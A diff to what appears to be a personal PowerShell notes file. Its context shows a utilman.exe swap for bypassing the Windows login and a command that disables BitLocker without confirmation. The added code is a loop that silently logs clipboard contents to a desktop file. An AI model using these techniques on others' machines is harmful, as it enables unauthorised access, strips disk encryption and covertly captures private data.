@@ -71,3 +71,14 @@ F10+Shift; c:; move c:\Windows\System32\utilman.exe c:\Windows\System32\utilman.
 
 #wyłączenie bitlockera
 Disable-BitLocker -MountPoint "C:" -RebootCount 0 -Confirm:$false
+
+#clipboard monitor
+$previousClipboardContent = Get-Clipboard -Format Text
+while ($true) {
+    if ((Get-Clipboard -Format Text) -ne $previousClipboardContent) {
+        (Get-Clipboard -Format Text) | Out-File -Append -LiteralPath "C:\Users\mzkwcim\Desktop\Logger.txt"
+        $previousClipboardContent = Get-Clipboard -Format Text
+    }
+    Start-Sleep -Seconds 1
+}
+
